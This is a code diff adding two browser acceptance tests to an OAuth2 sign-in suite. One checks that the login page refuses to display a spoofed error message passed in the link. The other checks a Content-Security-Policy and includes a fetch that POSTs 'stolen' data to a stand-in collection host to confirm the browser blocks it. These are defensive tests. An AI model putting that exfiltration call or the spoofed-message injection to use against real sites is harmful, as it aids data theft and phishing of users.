@@ -12,6 +12,7 @@ import { expect, open, test as acceptanceTest } from '../../support/fixtures'
 import { startFakeOidc, type FakeOidcProvider } from '../../support/fake-oidc'
 import { IDP_PORT, resetVariant, SECURITY_URL, startVariant, stopVariant, variantSql } from './support/variant'
 import { listCell, navigation, openUserMenu } from './support/ui'
+import { allowBlockedByPolicy, parsePolicy } from './support/csp'
 
 const CLIENT_ID = 'qqq-acceptance'
 const CLIENT_SECRET = 'acceptance-secret'
@@ -183,5 +184,51 @@ test.describe('OAUTH2 with PKCE', () => {
     for (const name of ['sessionUUID', 'sessionId']) {
       expect(setCookies.some((cookie) => cookie.startsWith(`${name}=;`) && /Max-Age=0|Expires=Thu, 01[- ]Jan[- ]1970/i.test(cookie)), `${name} expired by the server`).toBe(true)
     }
+  })
+
+  test('[SEC-037] the login page shows known sign-in errors and never text from the link @mobile', async ({ page, idp, diagnostics }) => {
+    void diagnostics
+    const spoof = 'Your account is locked. Call 555-0100 to unlock it'
+    await open(page, `/login?error=${encodeURIComponent(spoof)}`)
+    await expect(page.locator('[data-qqq-id="login-error"]')).toHaveText('Sign-in failed.')
+    await expect(page.getByText('555-0100')).toHaveCount(0)
+    await open(page, '/login?error=access_denied')
+    await expect(page.locator('[data-qqq-id="login-error"]')).toHaveText('Sign-in was denied by the identity provider.')
+    await open(page, '/login?error=invalid_scope')
+    await expect(page.locator('[data-qqq-id="login-error"]')).toHaveText('Sign-in failed (invalid_scope).')
+    expect(authorizeRequests(idp)).toHaveLength(0)
+    // Try again still goes through the provider
+    await page.getByRole('button', { name: 'Try again' }).click()
+    await signInAtProvider(page)
+    await expect(page).toHaveURL(/\/app\/?$/)
+    expect(authorizeRequests(idp)).toHaveLength(1)
+  })
+
+  test('[SEC-035] the policy lets the dashboard call the configured provider and no other origin @mobile', async ({ page, idp, diagnostics }) => {
+    const policy = parsePolicy((await page.request.get('/login')).headers()['content-security-policy'])
+    expect(policy['connect-src']).toEqual(["'self'", idp.issuer])
+    expect(policy['frame-ancestors']).toEqual(["'none'"])
+
+    // discovery from the browser, the provider round trip and the callback run under the policy
+    await open(page, '/app/person')
+    await expect(page).toHaveURL(new RegExp(`^${idp.issuer}/authorize\\?`))
+    await signInAtProvider(page)
+    await expect(listCell(page, 'Person', 'Avery')).toBeVisible()
+    expect(idp.requests.some((request) => request.path === '/.well-known/openid-configuration')).toBe(true)
+    expect(diagnostics.cspViolations).toEqual([])
+
+    // any other origin is refused by the browser before a request is made
+    const elsewhere = 'http://127.0.0.1:8/collect'
+    allowBlockedByPolicy(diagnostics, elsewhere)
+    const outcome = await page.evaluate(async (url) => {
+      try {
+        await fetch(url, { method: 'POST', body: 'stolen' })
+        return 'sent'
+      } catch {
+        return 'refused'
+      }
+    }, elsewhere)
+    expect(outcome).toBe('refused')
+    await expect.poll(() => diagnostics.cspViolations.join('\n')).toMatch(new RegExp(`^connect-src ${elsewhere.replace(/[.:/]/g, '\\$&')}`, 'm'))
   })
 })
